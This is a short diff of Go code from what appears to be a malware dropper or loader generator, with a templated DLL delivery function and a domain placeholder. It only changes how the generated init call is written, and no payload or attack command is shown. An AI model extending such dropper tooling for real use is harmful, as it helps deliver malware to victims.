@@ -72,7 +72,7 @@ var hope = "{{.Domain}}"
 
 func init() {
 	{{.ChkBox}}	
-	{{.Init}}()
+	{{.Init}}
 }
 func main() {
 
@@ -122,7 +122,7 @@ func (cd *LocalDropper) WriteSharedSrc(writer io.Writer) error {
 	cd.ProcAttach = delivery.DllFunc
 	cd.FuncName = FuncName
 	cd.Export = Export
-	cd.Init = cd.FuncName
+	cd.Init = cd.FuncName + "()"
 	err = tmpl.Execute(writer, cd)
 	return nil
 
